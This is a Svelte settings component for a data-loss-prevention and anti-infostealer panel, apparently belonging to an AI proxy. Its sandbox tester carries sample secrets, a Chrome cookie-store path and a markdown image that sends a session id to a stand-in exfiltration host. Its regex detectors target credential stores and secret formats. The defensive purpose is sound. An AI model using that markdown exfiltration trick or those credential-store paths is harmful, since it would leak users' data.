<script lang="ts">
  import { onMount } from "svelte";
  import Card from "../lib/ui/Card.svelte";
  import Badge from "../lib/ui/Badge.svelte";
  import Button from "../lib/ui/Button.svelte";
  import Toggle from "../lib/ui/Toggle.svelte";
  import Modal from "../lib/ui/Modal.svelte";
  import { notifications } from "../lib/notifications";
  import {
    fetchTokenSaverConfig,
    updateTokenSaverConfig,
    fetchSecurityRules,
    saveSecurityRules,
    type SecurityKeywordRule,
    type TokenSaverConfig,
  } from "../lib/api";

  let config = $state<TokenSaverConfig>({
    dlpEnabled: true,
    maskSecrets: true,
    maskPaths: true,
    sanitizeMarkdownImages: true,
    blockDangerousCommands: true,
  });

  let rules = $state<SecurityKeywordRule[]>([]);

  let isAddModalOpen = $state(false);
  let newPattern = $state("");
  let newAction = $state<"mask" | "block">("mask");
  let newDesc = $state("");

  // Sandbox Tester
  let sandboxInput = $state(
    "Please inspect this server log:\n" +
    "Found API Key: sk-ant-api03-abcdef12345678901234567890\n" +
    "User path: C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\n" +
    "AWS Key: AKIAIOSFODNN7EXAMPLE\n" +
    "Exfiltration attempt: ![track](https://malicious-telemetry.io/exfil?session=9821)\n" +
    "SSH Key: -----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA..."
  );
  let sandboxOutput = $state("");
  let detections = $state<string[]>([]);

  onMount(async () => {
    try {
      config = await fetchTokenSaverConfig();
    } catch {
      notifications.error("Failed to load security settings");
    }
    try {
      rules = await fetchSecurityRules();
    } catch {
      notifications.error("Failed to load custom security rules");
    }
    runSecurityTest();
  });

  async function saveToggles() {
    try {
      await updateTokenSaverConfig(config);
      notifications.success("Security settings updated");
    } catch {
      notifications.error("Failed to update security settings");
    }
  }

  async function handleAddRule() {
    if (!newPattern.trim()) return;
    const rule: SecurityKeywordRule = {
      id: `rule-${crypto.randomUUID()}`,
      pattern: newPattern.trim(),
      action: newAction,
      description: newDesc.trim() || `Custom rule: ${newPattern.trim()}`,
      enabled: true,
    };

    try {
      rules = await saveSecurityRules([...rules, rule]);
      isAddModalOpen = false;
      newPattern = "";
      newDesc = "";
      notifications.success("Security rule saved");
      runSecurityTest();
    } catch (error) {
      notifications.error(error instanceof Error ? error.message : "Failed to save security rule");
    }
  }

  async function handleDeleteRule(id: string) {
    try {
      rules = await saveSecurityRules(rules.filter((r) => r.id !== id));
      notifications.info("Rule removed");
      runSecurityTest();
    } catch (error) {
      notifications.error(error instanceof Error ? error.message : "Failed to remove security rule");
    }
  }

  function runSecurityTest() {
    let text = sandboxInput;
    const found: string[] = [];

    // 1. DLP API Keys
    if (config.maskSecrets) {
      if (/\bsk-[A-Za-z0-9_\-]{15,}\b/.test(text)) {
        found.push("DLP: Secret API Key Redacted");
        text = text.replace(/\bsk-[A-Za-z0-9_\-]{15,}\b/g, "[REDACTED_API_KEY]");
      }
      if (/\bAKIA[0-9A-Z]{16}\b/.test(text)) {
        found.push("DLP: AWS Access Key Redacted");
        text = text.replace(/\bAKIA[0-9A-Z]{16}\b/g, "[REDACTED_AWS_KEY]");
      }
      if (/-----BEGIN [A-Z0-9\s]+PRIVATE KEY-----/i.test(text)) {
        found.push("DLP: SSH/RSA Private Key Redacted");
        text = text.replace(/-----BEGIN [A-Z0-9\s]+PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z0-9\s]+PRIVATE KEY-----|$)/gi, "[REDACTED_PRIVATE_KEY]");
      }
    }

    // 2. Anti-Infostealer: Browser Cookies & DPAPI
    if (/\\Chrome\\User Data\\|\\Edge\\User Data\\|\\Cookies|Login Data/i.test(text)) {
      found.push("Anti-Infostealer: Browser Credential Vault Access Blocked");
      text = text.replace(/[a-zA-Z]:\\Users\\[^\s\\"'`]+(\\.*(?:Cookies|Login Data|Web Data))/gi, "[BLOCKED_BY_ANTI_INFOSTEALER: Browser Database Trap]");
    }

    // 3. User Path Anonymization
    if (config.maskPaths) {
      if (/[a-zA-Z]:\\Users\\[^\s\\"'`]+/i.test(text) || /\/(?:home|Users)\/[^\s\/"'`]+/i.test(text)) {
        found.push("DLP: OS Username & Home Path Anonymized");
        text = text.replace(/[a-zA-Z]:\\Users\\[^\s\\"'`]+(\\.*)?/gi, "/workspace$1");
        text = text.replace(/\/(?:home|Users)\/[^\s\/"'`]+(\/.*)?/gi, "/workspace$1");
      }
    }

    // 4. Anti-Exfiltration Images
    if (config.sanitizeMarkdownImages) {
      if (/!\[([^\]]*)\]\((https?:\/\/[^\)]+)\)/.test(text)) {
        found.push("DLP: Markdown Exfiltration URL Neutralized");
        text = text.replace(/!\[([^\]]*)\]\((https?:\/\/[^\)]+)\)/gi, "[External image link neutralized: $1]($2)");
      }
    }

    sandboxOutput = text;
    detections = found;
  }
</script>

<div class="space-y-6">
  <!-- Armor Header Card -->
  <Card padding="md" elev class="space-y-6">
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-border-subtle">
      <div>
        <div class="flex items-center gap-2">
          <h2 class="text-lg font-bold text-text-main tracking-tight">Security Armor & DLP Guard</h2>
          <Badge tone="success" size="sm">Active Defense</Badge>
        </div>
        <p class="text-xs text-text-muted mt-0.5">
          Enterprise Data Loss Prevention (DLP) secret redaction, Anti-Infostealer defenses, and jailbreak guardrails.
        </p>
      </div>

      <div class="flex items-center gap-2">
        <Button
          variant="primary"
          size="sm"
          onclick={() => (isAddModalOpen = true)}
        >
          <span class="material-symbols-outlined text-[16px]">add_moderator</span>
          <span>Add Rule</span>
        </Button>
      </div>
    </div>

    <!-- Active Shield Toggles Grid -->
    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
      <!-- Shield 1: Secret Redaction -->
      <div class="p-4 rounded-[10px] bg-surface-2 border border-border flex items-center justify-between gap-4">
        <div>
          <div class="flex items-center gap-2">
            <span class="material-symbols-outlined text-brand-500 text-[18px]">password</span>
            <span class="text-xs font-bold text-text-main">API Secret Masking</span>
          </div>
          <p class="text-[11px] text-text-muted mt-0.5">
            Auto-masks OpenAI, Anthropic, DeepSeek keys, and AWS credentials.
          </p>
        </div>
        <Toggle
          checked={config.maskSecrets ?? true}
          onchange={(val) => {
            config.maskSecrets = val;
            saveToggles();
            runSecurityTest();
          }}
        />
      </div>

      <!-- Shield 2: Anti-Infostealer -->
      <div class="p-4 rounded-[10px] bg-surface-2 border border-border flex items-center justify-between gap-4">
        <div>
          <div class="flex items-center gap-2">
            <span class="material-symbols-outlined text-red-400 text-[18px]">security</span>
            <span class="text-xs font-bold text-text-main">Anti-Infostealer Defense</span>
          </div>
          <p class="text-[11px] text-text-muted mt-0.5">
            Blocks exfiltration of browser cookie stores, DPAPI vault, and Keychains.
          </p>
        </div>
        <Toggle
          checked={config.blockDangerousCommands ?? true}
          onchange={(val) => {
            config.blockDangerousCommands = val;
            saveToggles();
            runSecurityTest();
          }}
        />
      </div>

      <!-- Shield 3: Path Anonymization -->
      <div class="p-4 rounded-[10px] bg-surface-2 border border-border flex items-center justify-between gap-4">
        <div>
          <div class="flex items-center gap-2">
            <span class="material-symbols-outlined text-emerald-400 text-[18px]">folder_special</span>
            <span class="text-xs font-bold text-text-main">Path Anonymization</span>
          </div>
          <p class="text-[11px] text-text-muted mt-0.5">
            Rewrites personal home directory and OS username to generic workspace path.
          </p>
        </div>
        <Toggle
          checked={config.maskPaths ?? true}
          onchange={(val) => {
            config.maskPaths = val;
            saveToggles();
            runSecurityTest();
          }}
        />
      </div>

      <!-- Shield 4: Anti-Exfiltration Markdown -->
      <div class="p-4 rounded-[10px] bg-surface-2 border border-border flex items-center justify-between gap-4">
        <div>
          <div class="flex items-center gap-2">
            <span class="material-symbols-outlined text-sky-400 text-[18px]">hide_image</span>
            <span class="text-xs font-bold text-text-main">Image Exfil Neutralizer</span>
          </div>
          <p class="text-[11px] text-text-muted mt-0.5">
            Neutralizes markdown image tracking pixels that attempt data exfiltration.
          </p>
        </div>
        <Toggle
          checked={config.sanitizeMarkdownImages ?? true}
          onchange={(val) => {
            config.sanitizeMarkdownImages = val;
            saveToggles();
            runSecurityTest();
          }}
        />
      </div>
    </div>
  </Card>

  <!-- Interactive Security Sandbox Tester -->
  <Card padding="md" elev class="space-y-4">
    <div class="flex items-center justify-between">
      <div>
        <h3 class="text-sm font-bold text-text-main flex items-center gap-2">
          <span class="material-symbols-outlined text-[18px] text-brand-500">biotech</span>
          <span>Security Sandbox & DLP Inspector</span>
        </h3>
        <p class="text-xs text-text-muted">
          Test sample payloads against active DLP filters and Anti-Infostealer defense in real-time.
        </p>
      </div>

      <Button variant="secondary" size="xs" onclick={runSecurityTest}>
        <span class="material-symbols-outlined text-[14px]">play_arrow</span>
        <span>Run Evaluation</span>
      </Button>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
      <!-- Input -->
      <div class="space-y-1.5">
        <label for="sandbox-sec-input" class="text-xs font-semibold text-text-muted flex items-center justify-between">
          <span>Raw Client Prompt / Log</span>
          <span class="text-[10px] font-mono text-amber-400">Unfiltered</span>
        </label>
        <textarea
          id="sandbox-sec-input"
          bind:value={sandboxInput}
          oninput={runSecurityTest}
          rows="8"
          class="w-full p-3 text-xs rounded-[8px] bg-surface-2 border border-border text-text-main font-mono focus:outline-hidden focus:border-brand-500 resize-none"
        ></textarea>
      </div>

      <!-- Output -->
      <div class="space-y-1.5">
        <label for="sandbox-sec-output" class="text-xs font-semibold text-text-muted flex items-center justify-between">
          <span>Upstream Transmitted Payload</span>
          <span class="text-[10px] font-mono text-emerald-400">Sanitized & Guarded</span>
        </label>
        <textarea
          id="sandbox-sec-output"
          value={sandboxOutput}
          readonly
          rows="8"
          class="w-full p-3 text-xs rounded-[8px] bg-surface-1 border border-border text-emerald-300 font-mono focus:outline-hidden resize-none"
        ></textarea>
      </div>
    </div>

    <!-- Defense Verdict Chips -->
    <div class="pt-2 flex flex-wrap items-center gap-2">
      <span class="text-xs text-text-muted font-medium">Triggered Defenses:</span>
      {#each detections as item}
        <Badge tone="success" size="sm">
          <span class="material-symbols-outlined text-[12px] mr-1">verified_user</span>
          <span>{item}</span>
        </Badge>
      {/each}
      {#if detections.length === 0}
        <span class="text-xs text-text-muted italic">Payload clean. No secrets or infostealer signatures detected.</span>
      {/if}
    </div>
  </Card>

  <!-- Rules Table -->
  <Card padding="none" elev class="overflow-hidden border-border-subtle">
    <div class="p-4 border-b border-border-subtle flex items-center justify-between bg-surface-2/40">
      <h3 class="text-sm font-bold text-text-main">Active Keyword Rules & Guardrail Patterns</h3>
      <span class="text-xs text-text-muted font-mono">{rules.length} Active Rules</span>
    </div>

    <div class="overflow-x-auto">
      <table class="w-full text-left text-xs font-mono">
        <thead class="bg-surface-2 text-text-muted uppercase tracking-wider border-b border-border-subtle">
          <tr>
            <th class="px-5 py-3 font-semibold font-sans">Pattern / Signature</th>
            <th class="px-5 py-3 font-semibold font-sans">Description</th>
            <th class="px-5 py-3 font-semibold font-sans">Action</th>
            <th class="px-5 py-3 font-semibold font-sans text-right">Remove</th>
          </tr>
        </thead>
        <tbody class="divide-y divide-border-subtle">
          {#each rules as r (r.id)}
            <tr class="hover:bg-surface-2/40 transition-colors">
              <td class="px-5 py-3.5 text-brand-400 font-bold">
                {r.pattern}
              </td>
              <td class="px-5 py-3.5 text-text-main font-sans">
                {r.description}
              </td>
              <td class="px-5 py-3.5 font-sans">
                <Badge tone={r.action === 'block' ? 'error' : 'primary'} size="sm">
                  {r.action.toUpperCase()}
                </Badge>
              </td>
              <td class="px-5 py-3.5 text-right font-sans">
                <Button
                  variant="ghost"
                  size="xs"
                  class="text-red-400 hover:text-red-300"
                  onclick={() => handleDeleteRule(r.id)}
                >
                  <span class="material-symbols-outlined text-[14px]">delete</span>
                </Button>
              </td>
            </tr>
          {/each}
        </tbody>
      </table>
    </div>
  </Card>
</div>

<!-- Add Rule Modal -->
<Modal
  open={isAddModalOpen}
  title="Add Custom Security Guardrail"
  onclose={() => (isAddModalOpen = false)}
>
  <form
    class="space-y-4"
    onsubmit={(e) => {
      e.preventDefault();
      handleAddRule();
    }}
  >
    <div class="space-y-1.5">
      <label for="pattern-input" class="text-xs font-semibold text-text-muted">Target Pattern or Keyword</label>
      <input
        id="pattern-input"
        type="text"
        bind:value={newPattern}
        placeholder="e.g. internal_corp_secret or [A-Z0-9]{20}"
        class="w-full px-3 py-2 text-xs rounded-[8px] bg-surface-2 border border-border text-text-main font-mono focus:outline-hidden focus:border-brand-500"
        required
      />
    </div>

    <div class="space-y-1.5">
      <label for="desc-input" class="text-xs font-semibold text-text-muted">Rule Description</label>
      <input
        id="desc-input"
        type="text"
        bind:value={newDesc}
        placeholder="e.g. Prevent accidental leakage of internal credentials"
        class="w-full px-3 py-2 text-xs rounded-[8px] bg-surface-2 border border-border text-text-main focus:outline-hidden focus:border-brand-500"
      />
    </div>

    <div class="space-y-1.5">
      <label for="action-select" class="text-xs font-semibold text-text-muted">Action on Match</label>
      <select
        id="action-select"
        bind:value={newAction}
        class="w-full px-3 py-2 text-xs rounded-[8px] bg-surface-2 border border-border text-text-main focus:outline-hidden focus:border-brand-500"
      >
        <option value="mask">Mask (Replace with [REDACTED])</option>
        <option value="block">Block (Reject Request with 403 Security Alert)</option>
      </select>
    </div>

    <div class="flex justify-end gap-2 pt-2">
      <Button variant="ghost" onclick={() => (isAddModalOpen = false)}>
        Cancel
      </Button>
      <Button variant="primary" type="submit" disabled={!newPattern.trim()}>
        Save Rule
      </Button>
    </div>
  </form>
</Modal>
